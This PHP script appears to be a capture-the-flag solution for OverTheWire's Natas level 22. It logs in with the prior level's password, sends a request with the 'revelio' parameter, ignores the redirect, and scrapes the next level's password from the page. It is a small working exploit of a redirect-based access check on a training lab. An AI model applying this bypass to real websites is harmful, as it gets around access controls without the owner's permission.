<?php
require_once dirname(__DIR__) . '/bootstrap.php';

$level = 22;
$username = 'natas' . $level;
$password = readFlag($level - 1);
$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

$response = $client->request('GET', $url, [
    'auth' => [$username, $password],
    'query' => ['revelio' => 'revelio'],
    'allow_redirects' => false,
]);

$body = (string)$response->getBody();
preg_match('/Password: (.*)<\/pre>/', $body, $flag);
echo $flag[1];
